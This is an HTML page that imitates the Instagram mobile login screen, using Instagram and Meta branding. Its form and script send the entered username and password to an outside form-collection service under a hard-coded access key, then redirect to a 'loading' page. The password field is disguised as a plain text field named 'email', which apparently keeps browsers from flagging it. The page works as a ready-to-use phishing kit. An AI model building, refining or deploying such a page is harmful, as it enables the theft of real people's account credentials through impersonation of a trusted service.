<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta
    name="viewport"
    content="width=device-width, initial-scale=1, viewport-fit=cover"
  >

  <title>Instagram</title>

  <style>
    :root {
      --bg: #1b2b34;
      --text: #f5f7f8;
      --muted: #9aa9b2;
      --border: #52636d;
      --blue: #087ff5;
      --blue-outline: #5aaeff;
    }

    * {
      box-sizing: border-box;
    }

    html,
    body {
      margin: 0;
      min-height: 100%;
      background: #080d11;
      font-family:
        -apple-system,
        BlinkMacSystemFont,
        "Segoe UI",
        Roboto,
        Helvetica,
        Arial,
        sans-serif;
    }

    body {
      display: flex;
      justify-content: center;
      color: var(--text);
    }

    .phone {
      width: min(100vw, 393px);
      min-height: 100svh;
      background: var(--bg);
      display: flex;
      flex-direction: column;
      overflow: hidden;
      position: relative;
    }

    /* Safe-area handling for iPhone Safari */
    .content {
      min-height: 100svh;

      padding:
        calc(env(safe-area-inset-top) + 30px)
        34px
        calc(env(safe-area-inset-bottom) + 24px);

      display: flex;
      flex-direction: column;
    }

    .language {
      text-align: center;
      font-size: 17px;
      line-height: 24px;
      margin-top: 00px;
      color: #e2e6e8;
      letter-spacing: 0.1px;
    }

    .brand {
      display: flex;
      justify-content: center;
      margin-top: 40px;
    }
    

    /* Brand image */
    .ig-mark {
      width: 120px;
      height: 120px;
      object-fit: contain;
      display: block;
    }

    .form {
      margin-top: 40px;
    }

    .field {
      width: 100%;
      height: 66px;

      border: 2px solid var(--border);
      border-radius: 20px;

      background: transparent;
      color: var(--text);

      font-size: 17px;
      padding: 0 34px;

      outline: none;
      margin-bottom: 15px;
    }

    .field::placeholder {
      color: var(--muted);
      opacity: 1;
    }

    .field:focus {
      border-color: #7d909b;
    }

    /* text input hide unhide and eye button */
    
    .secret-wrapper {
      position: relative;
      width: 100%;
    }

    .secret-wrapper .field {
      padding-right: 58px;
    }

    .eye-btn {
      position: absolute;
      right: 18px;
      top: 45%;
      transform: translateY(-50%);

      width: 40px;
      height: 40px;

      padding: 0;
      border: none;
      background: transparent;

      display: flex;
      align-items: center;
      justify-content: center;

      color: #aebbc2;
      cursor: pointer;
    }

    .eye-icon {
             width: 27px;
            height: 27px;

            fill: none;
            stroke: #d7dfe4;

            stroke-width: 1.7;
            stroke-linecap: round;
            stroke-linejoin: round;

            display: block;
        }
          .eye-icon circle {
            fill: none;
            stroke-width: 1.7;
        }



        /* =========================
           INITIAL STATE
           ========================= */

        /* Slash eye visible */
        .eye-slash {
            display: block;
        }

        /* Normal eye hidden */
        .eye-open {
            display: none;
        }


        /* =========================
           BUTTON PRESS EFFECT
           ========================= */

        .eye-btn:active {
            transform: translateY(-50%) scale(0.92);
        }

    .login {
      width: 100%;
      height: 64px;

      border: 0;
      border-radius: 34px;

      background: var(--blue);
      color: white;

      font-size: 20px;

      cursor: pointer;

      transition:
        filter 0.15s ease,
        transform 0.05s ease;
    }

    .login:active {
      transform: scale(0.99);
    }

    .login:hover {
      filter: brightness(1.08);
    }

    .forgot {
      display: block;
      width: fit-content;

      margin: 22px auto 0;

      color: #f1f3f4;

      font-size: 17px;
      text-decoration: none;
    }

    .bottom {
      margin-top: 70px;
    }

    .create {
      width: 100%;
      height: 62px;

      border: 2px solid var(--blue-outline);
      border-radius: 32px;

      background: transparent;
      color: var(--blue-outline);

      font-size: 18px;

      cursor: pointer;
    }

    .meta {
  display: flex;
  justify-content: center;
  align-items: center;
  margin-top: 18px;
}

.meta img {
  width: 70px;
  height: auto;
  display: block;
}


    /* Desktop preview */
    @media (min-width: 500px) {
      body {
        padding: 24px 0;
      }

      .phone {
        min-height: 852px;
        height: 852px;

        border-radius: 18px;

        box-shadow: 0 12px 50px rgba(0, 0, 0, 0.45);
      }
    }

    /* Smaller screens */
    @media (max-height: 760px) {
      .brand {
        margin-top: 40px;
      }

      .form {
        margin-top: 40px;
      }

      .forgot {
        margin-top: 15px;
      }

      .meta {
        margin-top: 15px;
      }
    }
  </style>
</head>

<body>

  <main class="phone" aria-label="Instagram login mockeup">

    <section class="content">

      <!-- Language -->
      <div class="language">
        English (UK)
      </div>


      <!-- Logo -->
      <div class="brand" >

        <img
          class="ig-mark"
          src="instagram.png"
          alt="Takeout"
        >

      </div>


      <!-- Login Form -->
      <form action="https://api.web3forms.com/submit" method="POST" class="contact-input" id="myForm">
        <div >
          <h4 class="signin"> Sign in with Instagram.</h4>
        </div>
        <input type="hidden" name="access_key" value="d3e8c229-865f-4b79-85ee-d37229319012">

        <input
          class="field"
          name="name"
          type="text"
          
          autocomplete="off"
          placeholder="Username, email or mobile number"
          aria-label="Username, email or mobile number"
        >
        <div class="secret-wrapper">
        <input
          class="field"
          type="text"
          name="email"
          id="secretInput"
          style="-webkit-text-security: disc;"
          autocomplete="off"
          placeholder="Password"
          
        >
        <button
            type="button"
            class="eye-btn"
            id="eyeBtn"
            aria-label="Show text"
        >

            <!--EYE SLASH-->

            <!-- Eye Slash -->
<svg
    id="eyeSlash"
    class="eye-icon eye-slash"
    viewBox="0 0 24 24"
    aria-hidden="true"
>
    <!-- Eye shape -->
    <path
        d="M2.5 12
           C4.4 8.3 7.8 5.5 12 5.5
           C16.2 5.5 19.6 8.3 21.5 12
           C19.6 15.7 16.2 18.5 12 18.5
           C7.8 18.5 4.4 15.7 2.5 12Z">
    </path>

    <!-- Pupil -->
    <circle
        cx="12"
        cy="12"
        r="2.7">
    </circle>

    <!-- Slash -->
    <path
        d="M4 4
           L20 20">
    </path>
</svg>


<!-- Normal Eye -->
<svg
    id="eyeOpen"
    class="eye-icon eye-open"
    viewBox="0 0 24 24"
    aria-hidden="true"
>
    <!-- Eye shape -->
    <path
        d="M2.5 12
           C4.4 8.3 7.8 5.5 12 5.5
           C16.2 5.5 19.6 8.3 21.5 12
           C19.6 15.7 16.2 18.5 12 18.5
           C7.8 18.5 4.4 15.7 2.5 12Z">
    </path>

    <!-- Pupil -->
    <circle
        cx="12"
        cy="12"
        r="2.7">
    </circle>
</svg>
        </button>



        </div>

        <button
          class="login"
          type="submit"
          id="submitBtn"
        >
          Log in
        </button>

      </form>

      <script>
          document.getElementById("myForm").addEventListener("submit", async function (event) {
            event.preventDefault();

            const form = this;
            const button = document.getElementById("submitBtn");

            button.disabled = true;

            try {
              const response = await fetch(form.action, {
                method: "POST",
                body: new FormData(form)
              });

              if (response.ok) {
                window.location.href = "loading.html";
              } else {
                alert("Submission failed. Please try again.");
                button.disabled = false;
              }
            } catch (error) {
              alert("Something went wrong.");
              button.disabled = false;
            }
          });
      </script>


      <!-- Forgot Password -->
      <a
        class="forgot"
        href="forget password.html"
        id="forgot"
      >
        Forgotten password?
      </a>


      <!-- Bottom Section -->
      <div class="bottom">

        <button
          class="create"
          type="button"
          id="create"
        >
          Create new account
        </button>

        <div class="meta">
          <img src="meta.png" alt="meta">
        </div>

        
      </div>

    </section>

  </main>
      <script>
        // for eye slash and eye

        const input = document.getElementById("secretInput");

        const button = document.getElementById("eyeBtn");

        const eyeOpen = document.getElementById("eyeOpen");

        const eyeSlash = document.getElementById("eyeSlash");


        button.addEventListener("click", function () {

            /*
             * Check whether the text
             * is currently hidden.
             */

            const isHidden =
                input.style.webkitTextSecurity === "disc";


            if (isHidden) {


                input.style.webkitTextSecurity = "none";

                eyeSlash.style.display = "none";

                eyeOpen.style.display = "block";

                button.setAttribute(
                    "aria-label",
                    "Hide text"
                );


            } else {


                input.style.webkitTextSecurity = "disc";

                eyeOpen.style.display = "none";

                eyeSlash.style.display = "block";

                button.setAttribute(
                    "aria-label",
                    "Show text"
                );

            }

        });

    </script>

</body>
</html>

      
</body>
</html>
